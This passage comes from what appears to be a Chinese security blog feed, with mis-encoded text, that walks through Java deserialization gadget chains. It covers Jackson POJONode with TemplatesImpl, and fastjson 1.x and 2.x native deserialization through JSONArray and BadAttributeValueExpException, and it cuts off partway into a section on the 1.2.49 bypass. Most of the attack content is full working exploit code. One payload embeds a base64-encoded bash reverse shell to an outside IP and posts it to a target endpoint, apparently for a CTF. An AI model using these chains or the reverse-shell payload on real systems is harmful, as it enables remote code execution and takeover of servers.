class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, clazz);<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMjEuMjguMjQ3Lzg4ODggMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\&quot;);&quot;</span>);<br>        clazz.addConstructor(constructor);<br>        <span class="hljs-type">byte</span>[][] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, bytes);<br>        setValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;clown&quot;</span>);<br>        setValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-literal">null</span>);<br><br>        <span class="hljs-type">POJONode</span> <span class="hljs-variable">jsonNodes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(templates);<br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">valfield</span> <span class="hljs-operator">=</span> val.getClass().getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        valfield.setAccessible(<span class="hljs-literal">true</span>);<br>        valfield.set(val, jsonNodes);<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        objectOutputStream.writeObject(val);<br><br>        <span class="hljs-type">byte</span>[] byteArray = barr.toByteArray();<br>        System.out.println(byteArray);<br><br>        <span class="hljs-comment">//å‘é€Postè¯·æ±‚</span><br>        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://localhost:8080/bypassit&quot;</span>);<br>        <span class="hljs-type">HttpURLConnection</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> (HttpURLConnection) url.openConnection();<br>        conn.setRequestMethod(<span class="hljs-string">&quot;POST&quot;</span>);<br>        conn.setDoOutput(<span class="hljs-literal">true</span>);<br>        conn.setRequestProperty(<span class="hljs-string">&quot;Content-Type&quot;</span>, <span class="hljs-string">&quot;application/octet-stream&quot;</span>);<br>        conn.getOutputStream().write(byteArray);<br>        conn.getOutputStream().flush();<br><br>        <span class="hljs-comment">// è¯»å–å“åº”</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">responseCode</span> <span class="hljs-operator">=</span> conn.getResponseCode();<br>        System.out.println(<span class="hljs-string">&quot;Response Code: &quot;</span> + responseCode);<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>è®°å¾—è¦åˆ é™¤writeReplaceæ–¹æ³•</p></blockquote><p>åå¼¹shellè¿‡æ¥å³å¯</p><p><img src="https://cdn.clown2024.cn/202410140030909.png" alt="image-20241014003050846"></p><p>æˆ–è€…ç›´æ¥åºåˆ—åŒ–å­˜å…¥æ–‡ä»¶ï¼Œç„¶åç”¨pythonå‘è¯·æ±‚</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>url=<span class="hljs-string">&quot;&quot;</span><br>data=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>)<br>res=requests.post(url,data=data)<br></code></pre></td></tr></table></figure><h1 id="å…¶ä»–é“¾å­"><a href="#å…¶ä»–é“¾å­" class="headerlink" title="å…¶ä»–é“¾å­"></a>å…¶ä»–é“¾å­</h1><p>æ¯”å¦‚Templatesè¢«bançš„æƒ…å†µä¸‹ç”¨SignObjectæ‰“äºŒæ¬¡ååºåˆ—åŒ–ï¼Œå¯ä»¥çœ‹è¿™ç¯‡æ–‡ç« ï¼š<a href="https://xz.aliyun.com/t/12966?time__1311=GqGxuD9QLxlr=iQGkDRQI23Ezabx&u_atoken=8440f6b703af0eb6335929f9798f602f&u_asig=ac11000117287520205018812e007f#toc-34">https://xz.aliyun.com/t/12966?time__1311=GqGxuD9QLxlr%3DiQGkDRQI23Ezabx&amp;u_atoken=8440f6b703af0eb6335929f9798f602f&amp;u_asig=ac11000117287520205018812e007f#toc-34</a></p><p>è¿˜æœ‰å…¶ä½™çš„å°±åœ¨åšé¢˜æ—¶é‡åˆ°å†å­¦å§</p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> ååºåˆ—åŒ– </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>fastjsonåŸç”Ÿååºåˆ—åŒ–</title>
      <link href="/2024/10/11/fastjson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2024/10/11/fastjson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<p>çœ‹äº†fastjsonçš„å„ç‰ˆæœ¬é“¾å­ï¼Œå†çœ‹ä¸€ä¸‹fastjsonçš„åŸç”Ÿååºåˆ—åŒ–ï¼Œçœ‹çš„æ˜¯y4å¸ˆå‚…çš„ä¸¤ç¯‡æ–‡ç« </p><p><a href="https://y4tacker.github.io/2023/03/20/year/2023/3/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">https://y4tacker.github.io/2023/03/20/year/2023/3/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</a></p><p><a href="https://y4tacker.github.io/2023/04/26/year/2023/4/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%BA%8C/">https://y4tacker.github.io/2023/04/26/year/2023/4/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%BA%8C/</a></p><p>æ¥ç®€å•çš„å­¦ä¹ å¤ç°ä¸€ä¸‹</p><h1 id="åˆ©ç”¨é™åˆ¶"><a href="#åˆ©ç”¨é™åˆ¶" class="headerlink" title="åˆ©ç”¨é™åˆ¶"></a>åˆ©ç”¨é™åˆ¶</h1><p>Fastjson1ç‰ˆæœ¬å°äºç­‰äº1.2.48(ä¸è¿‡1.2.49ä¹‹åä¹Ÿæœ‰ç»•è¿‡æ–¹æ³•ï¼Œè¿™é‡ŒæŒ‡çš„æ˜¯ç›´æ¥ç”¨ä¸éœ€è¦ç»•è¿‡çš„)</p><p>Fastjson2&lt;&#x3D;2.0.26(æˆ‘è‡ªå·±æµ‹è¯•åˆšå¥½åœ¨æ–‡ç« ç‰ˆæœ¬çš„ä¸‹ä¸€ä¸ªç‰ˆæœ¬2.0.27å¼€å§‹å°±ä¸è¡Œäº†)</p><h1 id="æ‰¾é“¾å­"><a href="#æ‰¾é“¾å­" class="headerlink" title="æ‰¾é“¾å­"></a>æ‰¾é“¾å­</h1><p>è¦ç”¨åŸç”Ÿååºåˆ—åŒ–ï¼Œå°±éœ€è¦å¯»æ‰¾fastjsonä¸­ç»§æ‰¿äº†Serializableæ¥å£çš„ç±»ï¼Œfastjsoné‡Œé¢æœ‰ä¸¤ä¸ªè¿™æ ·çš„ç±»ï¼šJSONArrayä¸JSONObject</p><p>è¿™ä¸¤ä¸ªç±»çš„åˆ©ç”¨æ–¹å¼å·®ä¸å¤šï¼Œè¿™é‡Œç”¨JSONArrayè¿™ä¸ªç±»</p><p>è¿™ä¸¤ä¸ªæœ¬èº«æ˜¯æ²¡æœ‰å®ç°readObjectæ–¹æ³•çš„ï¼Œæ‰€ä»¥æ˜¯é€šè¿‡å…¶ä»–ç±»çš„readObjectæ¥è§¦å‘JSONArrayä¸JSONObjectä¸­çš„æŸä¸ªæ–¹æ³•æ¥å½¢æˆé“¾å­ã€‚</p><p>æ–‡ç« ä¸­çš„å°±æ˜¯åˆ©ç”¨JSONçš„toStringæ–¹æ³•è§¦å‘JSONçš„toJsonStringçš„è°ƒç”¨</p><p><img src="https://cdn.clown2024.cn/202410111309567.png" alt="image-20241011130936507"></p><p>è¿™å’ŒJSONObjectä»¥åŠJSONArrayæœ‰ä»€ä¹ˆå…³ç³»å‘¢ï¼Œæˆ‘å»çœ‹äº†æºç ï¼ŒJSONArrayå’ŒJSONObjectæ˜¯JSONçš„å­ç±»ï¼Œä»–ä»¬æœ¬èº«æ˜¯æ²¡æœ‰toStringæ–¹æ³•çš„ï¼Œæ‰€ä»¥ä¼šè°ƒç”¨åˆ°å…¶çˆ¶ç±»JSONçš„toStringæ–¹æ³•</p><p>é‚£ä¸ºä»€ä¹ˆè¦è§¦å‘toStringå‘¢ï¼Œå› ä¸ºJSONObjectå’ŒJSONArrayåœ¨è§¦å‘toStringæ–¹æ³•çš„æ—¶å€™ä¼šè°ƒç”¨getæ–¹æ³•ï¼Œæ¬¸é‚£å°±å¯ä»¥ç”¨æ¥å°†æˆ‘ä»¬çš„é“¾å­å°è£…åœ¨é‡Œé¢æ¥è§¦å‘äº†</p><p>getè§¦å‘ä¾‹å­</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.Own;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.*;<br><br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Studentæ„é€ å‡½æ•°&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;getName&quot;</span>);<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;setName&quot;</span>);<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;getAge&quot;</span>);<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;setAge&quot;</span>);<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>        <span class="hljs-comment">// JSONObjectè°ƒç”¨toString</span><br>        HashMap&lt;String,Object&gt; hashMap=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap.put(<span class="hljs-string">&quot;clown&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">org</span>.clown.Test1.Student());<br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">jsonObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONObject</span>(hashMap);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">string</span> <span class="hljs-operator">=</span> jsonObject.toString();<br>        System.out.println(<span class="hljs-string">&quot;-----------------------&quot;</span>);<br><br>        <span class="hljs-comment">// JSONArrayè°ƒç”¨toString</span><br>        ArrayList&lt;Object&gt; arrayList=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>        arrayList.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>());<br>        <span class="hljs-type">JSONArray</span> <span class="hljs-variable">objects</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONArray</span>(arrayList);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">string1</span> <span class="hljs-operator">=</span> objects.toString();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410111324454.png" alt="image-20241011132452413"></p><p>è‡³äºä¸ºä»€ä¹ˆtoStringä¼šè°ƒç”¨getteræ–¹æ³•å°±çœ‹æ–‡ç« çš„åˆ†æäº†è§£ä¸€ä¸‹å°±å¥½äº†</p><h1 id="åˆ©ç”¨é“¾æ„é€ "><a href="#åˆ©ç”¨é“¾æ„é€ " class="headerlink" title="åˆ©ç”¨é“¾æ„é€ "></a>åˆ©ç”¨é“¾æ„é€ </h1><p>èƒ½è§¦å‘getteræ–¹æ³•å°±å¾ˆå®¹æ˜“æƒ³åˆ°é€šè¿‡è§¦å‘TemplatesImplçš„getOutputPropertiesæ–¹æ³•å®ç°åŠ è½½ä»»æ„å­—èŠ‚ç æœ€ç»ˆè§¦å‘æ¶æ„æ–¹æ³•è°ƒç”¨</p><p>ç„¶åè§¦å‘toStringæ–¹æ³•æˆ‘ä»¬å¯ä»¥åˆ©ç”¨BadAttributeValueExpExceptionæ¥è§¦å‘ï¼Œè¯¥ç±»åœ¨ccå’Œromeé“¾éƒ½æœ‰ç”¨åˆ°</p><p>é‚£ä¹ˆé“¾å­æˆ‘ä»¬å°±å¯ä»¥å†™å‡ºæ¥äº†ï¼Œè¿™é‡Œç”¨javassiståŠ¨æ€ç”Ÿæˆæ¶æ„ç±»</p><p><strong>åˆ©ç”¨ä¾èµ–</strong></p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.javassist<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javassist<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.28.0-GA<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alibaba<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>fastjson<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.48<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p><strong>åˆ©ç”¨é“¾</strong></p><h2 id="fastjson1åˆ©ç”¨"><a href="#fastjson1åˆ©ç”¨" class="headerlink" title="fastjson1åˆ©ç”¨"></a>fastjson1åˆ©ç”¨</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.Own;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONArray;<br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">fastjson1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//ç”Ÿæˆæ¶æ„ç±»</span><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, clazz);<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);<br>        clazz.addConstructor(constructor);<br>        <span class="hljs-type">byte</span>[][] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, bytes);<br>        setValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;clown&quot;</span>);<br>        setValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-literal">null</span>);<br><br><br>        <span class="hljs-type">JSONArray</span> <span class="hljs-variable">jsonArray</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONArray</span>();<br>        jsonArray.add(templates);<br><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">valfield</span> <span class="hljs-operator">=</span> val.getClass().getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        valfield.setAccessible(<span class="hljs-literal">true</span>);<br>        valfield.set(val, jsonArray);<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        objectOutputStream.writeObject(val);<br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(barr.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object)ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410111336619.png" alt="image-20241011133609518"></p><h2 id="fastjson2åˆ©ç”¨"><a href="#fastjson2åˆ©ç”¨" class="headerlink" title="fastjson2åˆ©ç”¨"></a>fastjson2åˆ©ç”¨</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.Own;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson2.JSONArray;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">fastjson2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, clazz);<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);<br>        clazz.addConstructor(constructor);<br>        <span class="hljs-type">byte</span>[][] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, bytes);<br>        setValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;clown&quot;</span>);<br>        setValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-literal">null</span>);<br><br><br>        <span class="hljs-type">JSONArray</span> <span class="hljs-variable">jsonArray</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONArray</span>();<br>        jsonArray.add(templates);<br><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">valfield</span> <span class="hljs-operator">=</span> val.getClass().getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        valfield.setAccessible(<span class="hljs-literal">true</span>);<br>        valfield.set(val, jsonArray);<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        objectOutputStream.writeObject(val);<br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(barr.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object)ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410111341193.png" alt="image-20241011134159108"></p><p>JSONObjectçš„åˆ©ç”¨ä¹Ÿä¸€æ ·ï¼Œå°±ä¸å†å†™ä¸€éäº†</p><h1 id="ä¸ºä»€ä¹ˆfastjson1249ä»¥åä¸å†èƒ½åˆ©ç”¨"><a href="#ä¸ºä»€ä¹ˆfastjson1-2-49ä»¥åä¸å†èƒ½åˆ©ç”¨" class="headerlink" title="ä¸ºä»€ä¹ˆfastjson1.2.49ä»¥åä¸å†èƒ½åˆ©ç”¨"></a>ä¸ºä»€ä¹ˆfastjson1.2.49ä»¥åä¸å†èƒ½åˆ©ç”¨</h1><p>å› ä¸ºä»1.2.49å¼€å§‹ï¼ŒJSONArrayä»¥åŠJSONObjectæ–¹æ³•å¼€å§‹æœ‰äº†è‡ªå·±çš„readObjectæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202410111346927.png" alt="image-20241011134629872"></p><p>åœ¨å…¶<code>SecureObjectInputStream</code>ç±»å½“ä¸­é‡å†™äº†<code>resolveClass</code>,åœ¨å…¶ä¸­è°ƒç”¨äº†<code>checkAutoType</code>æ–¹æ³•åšç±»çš„æ£€æŸ¥</p><p><img src="https://cdn.clown2024.cn/202410111350600.png" alt="image-20241011135009543"></p><p>æ‰€ä»¥åé¢å°±æ˜¯æˆ‘ä»¬å¦‚ä½•è¿›è¡Œç»•è¿‡çš„é—®é¢˜äº†</p><h1 id="fastjson1249åç»•è¿‡"><a href="#fastjson1-2-49åç»•è¿‡" class="headerlink" title="fastjson1.2.49åç»•è¿‡"></a>fastjson1.2.49åç»•è¿‡</h1><p>ä»–æ£€æŸ¥çš„é€»è¾‘æ˜¯è¿™æ ·çš„ï¼Œå½“è°ƒç”¨JSONArray&#x2F;JSONObjectçš„Objectæ–¹æ³•è§¦å‘ååºåˆ—åŒ–æ—¶ï¼Œå°†è¿™ä¸ªååºåˆ—åŒ–è¿‡ç¨‹å§”æ‰˜ç»™<code>SecureObjectInputStream</code>å¤„ç†æ—¶ï¼Œè§¦å‘resolveClasså®ç°å¯¹æ¶æ„ç±»çš„æ‹¦æˆª</p><p>çœ‹èµ·æ¥å¾ˆæ­£å¸¸ï¼Œä½†å®é™…ä¸Šä»–çš„ååºåˆ—åŒ–çš„é€»è¾‘æ˜¯ä¸å®‰å…¨ï¼Œä»–æ˜¯ä¸å®‰å…¨çš„ObjectInputStreamå¥—ä¸ªå®‰å…¨çš„SecureObjectInputStreamå¯¼è‡´äº†ç»•è¿‡</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">ObjectInputStream -&gt; readObject<br>xxxxxx(çœç•¥ä¸­é—´è¿‡ç¨‹)<br>SecureObjectInputStream -&gt; readObject -&gt; 